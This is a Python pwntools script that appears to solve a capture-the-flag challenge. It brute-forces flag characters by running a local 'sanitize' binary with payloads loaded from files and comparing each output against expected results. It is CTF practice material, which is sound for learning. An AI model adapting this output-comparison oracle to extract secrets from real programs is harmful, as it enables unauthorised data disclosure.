from __future__ import print_function
from pwn import *  
from time import *
context.log_level = 'error'

payloads = []
check = []
g = open('payload','r')
h = open('check','r')
for i in range(0x7f-0x20):
    s = g.read(14)
    payloads.append(s)
    s = h.read(657)
    check.append(s)
g.close()
h.close()
check1 = []


for i in range(0x7f-0x20):
    check1.append('')
print(check1)

print('flag{')
for ii in  range(0x20,0x7f):
    f = open('flag','w+')
    f.write('flag{'+chr(ii))
    f.close()
    print(chr(ii),end=' ')
    t = open('check2','a')
    for i in range(0x20,0x7f-2):
        payload = payloads[i-0x20][0:8]+str(5)+payloads[i-0x20][9:]
        p = process('./sanitize')
        p.send(payload)
        s = p.recv()
        p.close()
        payload = payloads[i-0x20+1][0:8]+str(5)+payloads[i-0x20+1][9:]
        p = process('./sanitize')
        p.send(payload)
        r = p.recv()
        p.close()

        if s!= check[i-0x20] and r == check[i-0x20+1]:
            t.write(chr(i+1))
            print(chr(i+1),end = '')
    t.write('\n') 
    t.close()       
    print('')